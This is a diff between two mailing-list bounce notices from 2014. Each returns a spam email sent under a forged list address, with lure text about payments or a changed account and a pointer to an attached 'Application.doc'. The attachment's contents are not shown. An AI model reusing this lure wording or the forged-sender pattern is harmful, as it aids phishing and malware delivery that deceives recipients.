@@ -1,9 +1,9 @@
-From: MAILER-DAEMON-5Mp3MHzwbMBhvkcftpj9HuTW4wlIGRCZ@public.gmane.org (Mail Delivery System)
+From: MAILER-DAEMON-sFbbPxZDHXw0n/F98K4Iww@public.gmane.org (Mail Delivery System)
 Subject: Undelivered Mail Returned to Sender
-Date: Tue, 22 Jul 2014 21:47:46 -0700 (PDT)
-Message-ID: <3hJ40y0GmSzVj6q@bolt9a.mxthunder.net>
+Date: Wed, 23 Jul 2014 17:46:54 +1000 (EST)
+Message-ID: <20140723074654.EA8D43C49BF@mail106.syd.optusnet.com.au>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============0319517299474176377=="
+Content-Type: multipart/mixed; boundary="===============1893953479196281144=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -19,17 +19,17 @@ List-Id: containers.vger.kernel.org
 
 This is a MIME-encapsulated message.
 
---===============0319517299474176377==
+--===============1893953479196281144==
 Content-Type: multipart/report; report-type=delivery-status;
-	boundary="3hJ40p0LwJz3SgtG.1406090866/bolt9a.mxthunder.net"
+	boundary="7B2BD3C4923.1406101614/mail106.syd.optusnet.com.au"
 
 This is a MIME-encapsulated message.
 
---3hJ40p0LwJz3SgtG.1406090866/bolt9a.mxthunder.net
+--7B2BD3C4923.1406101614/mail106.syd.optusnet.com.au
 Content-Description: Notification
 Content-Type: text/plain; charset=us-ascii
 
-This is the mail system at host bolt9a.mxthunder.net.
+This is the mail system at host mail106.syd.optusnet.com.au.
 
 I'm sorry to have to inform you that your message could not
 be delivered to one or more recipients. It's attached below.
@@ -41,65 +41,62 @@ delete your own text from the attached returned message.
 
                    The mail system
 
-<gefry-Mbffm4Bjnif0CCvOHzKKcA@public.gmane.org>: host mx1.sunet.com.au[203.206.208.88] said: 550
-    <gefry-Mbffm4Bjnif0CCvOHzKKcA@public.gmane.org>: Recipient address rejected: User unknown in local
-    recipient table (in reply to RCPT TO command)
+<jakeey-sFbbPxZDHXw0n/F98K4Iww@public.gmane.org> (expanded from <jakeey-yP2FWuG//QYQrrorzV6ljw@public.gmane.org>): user unknown
 
---3hJ40p0LwJz3SgtG.1406090866/bolt9a.mxthunder.net
+--7B2BD3C4923.1406101614/mail106.syd.optusnet.com.au
 Content-Description: Delivery report
 Content-Type: message/delivery-status
 
-Reporting-MTA: dns; bolt9a.mxthunder.net
-X-Postfix-Queue-ID: 3hJ40p0LwJz3SgtG
+Reporting-MTA: dns; mail106.syd.optusnet.com.au
+X-Postfix-Queue-ID: 7B2BD3C4923
 X-Postfix-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-Arrival-Date: Tue, 22 Jul 2014 21:47:22 -0700 (PDT)
+Arrival-Date: Wed, 23 Jul 2014 17:46:52 +1000 (EST)
 
-Final-Recipient: rfc822; gefry-Mbffm4Bjnif0CCvOHzKKcA@public.gmane.org
-Original-Recipient: rfc822;gefry-Mbffm4Bjnif0CCvOHzKKcA@public.gmane.org
+Final-Recipient: rfc822; jakeey-sFbbPxZDHXw0n/F98K4Iww@public.gmane.org
+Original-Recipient: rfc822;jakeey-yP2FWuG//QYQrrorzV6ljw@public.gmane.org
 Action: failed
-Status: 5.0.0
-Remote-MTA: dns; mx1.sunet.com.au
-Diagnostic-Code: smtp; 550 <gefry-Mbffm4Bjnif0CCvOHzKKcA@public.gmane.org>: Recipient address rejected:
-    User unknown in local recipient table
+Status: 5.1.1
+Diagnostic-Code: x-unix; user unknown
 
---3hJ40p0LwJz3SgtG.1406090866/bolt9a.mxthunder.net
+--7B2BD3C4923.1406101614/mail106.syd.optusnet.com.au
 Content-Description: Undelivered Message
 Content-Type: message/rfc822
 
 Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Received: by bolt9a.mxthunder.net (Postfix, from userid 12345)
-	id 3hJ40p0LwJz3SgtG; Tue, 22 Jul 2014 21:47:26 -0700 (PDT)
-Received: from vps-77.205.170.217.stwvps.net (vps-77.205.170.217.stwvps.net [217.170.205.77])
-	by bolt9a.mxthunder.net (Postfix) with ESMTP id 3hJ40W0fJJz3Sgw3
-	for <gefry-Mbffm4Bjnif0CCvOHzKKcA@public.gmane.org>; Tue, 22 Jul 2014 21:47:22 -0700 (PDT)
-Received: from [217.170.205.77] by vps-77.205.170.217.stwvps.net id p78JbPHBLA; Wed, 23 Jul 2014 04:47:22 +0000
-Message-ID: <003a01cfa631$2f0ca580$01000a0a-TM4mHzyjtj4AtLqT4ilZHR7XDzrqbE6sLFdjfZeId84@public.gmane.org>
-From: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-To: <gefry-Mbffm4Bjnif0CCvOHzKKcA@public.gmane.org>
-Subject: Re[2]: payment
-Date: Wed, 23 Jul 2014 04:47:22 +0000
+Received: from portal.obeikan.com.sa (unknown [184.154.100.154])
+	by mail106.syd.optusnet.com.au (Postfix) with ESMTP id 7B2BD3C4923
+	for <jakeey-yP2FWuG//QYQrrorzV6ljw@public.gmane.org>; Wed, 23 Jul 2014 17:46:52 +1000 (EST)
+Received: from [184.154.100.154] by portal.obeikan.com.sa id Z87lLVQy3LjL with SMTP; Wed, 23 Jul 2014 07:09:03 +0000
+Date: Wed, 23 Jul 2014 07:09:03 +0000
+From: "Adreana" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v2.06.3) Home
+X-Priority: 3 (Normal)
+Message-ID: <3604379891.99310145546919-MmIyCnPGEFDAFmtwL2SGOwOkpG7+uPjq@public.gmane.org>
+To: <jakeey-yP2FWuG//QYQrrorzV6ljw@public.gmane.org>
+Subject: Information about payments
 MIME-Version: 1.0
 Content-Type: multipart/mixed;
  boundary="----------126C01C51DBCF31C"
-X-MXTHUNDER-Identifier: <003a01cfa631$2f0ca580$01000a0a-TM4mHzyjtj4AtLqT4ilZHR7XDzrqbE6sLFdjfZeId84@public.gmane.org>
-X-MXTHUNDER-IP-Rating: 0, 217.170.205.77, Ugly c=0.595069 p=-0.819876 Source Normal
-X-MXTHUNDER-Scan-Result: 0
-X-MXTHUNDER-Rules: 0-0-0-32767-c
-X-MXTHUNDER-Clean: Yes
-X-MXTHUNDER-Group: OK
+X-Optus-CM-Score: 0
+X-Optus-CM-Analysis: v=2.1 cv=B4eAjodM c=1 sm=1 tr=0
+	a=djP11DF0yJyQ26pFUmP7tA==:117 a=djP11DF0yJyQ26pFUmP7tA==:17
+	a=NEiEQogP1MkA:10 a=Z4Rwk6OoAAAA:8 a=a8_HU8NaAAAA:8 a=Pyw_07L0AAAA:8
+	a=GDJurOxAN53Wft0SrA4A:9 a=CjuIK1q_8ugA:10 a=4Y6PSookihIA:10
+	a=Q9X0ObaNBSsA:10 a=BvEPH07sH_wA:10 a=kheoFVORIJhbc5vQwLQA:9
+	a=diV1Cm6KfS4A:10
 
 ------------126C01C51DBCF31C
 Content-Type: text/plain; charset=us-ascii
 Content-Transfer-Encoding: 7bit
 
-Hello gefry-Mbffm4Bjnif0CCvOHzKKcA@public.gmane.org,    
-      
-Send you the answer to your question about the profile on our site.
-Details are given in Annex.  
+Hello jakeey-yP2FWuG//QYQrrorzV6ljw@public.gmane.org,   
+   
+Your account has been changed. Please read the information.
+See the attached file.  
   
 --       
-Best regards,  
-Peppard Pearl
+Best regards,   
+Plotkin Kate
 ------------126C01C51DBCF31C
 Content-Type: application/octet-stream;
  name="Application.doc"
@@ -690,9 +687,9 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAA=
 
 
 
---3hJ40p0LwJz3SgtG.1406090866/bolt9a.mxthunder.net--
+--7B2BD3C4923.1406101614/mail106.syd.optusnet.com.au--
 
---===============0319517299474176377==
+--===============1893953479196281144==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -702,4 +699,4 @@ _______________________________________________
 Containers mailing list
 Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============0319517299474176377==--
+--===============1893953479196281144==--
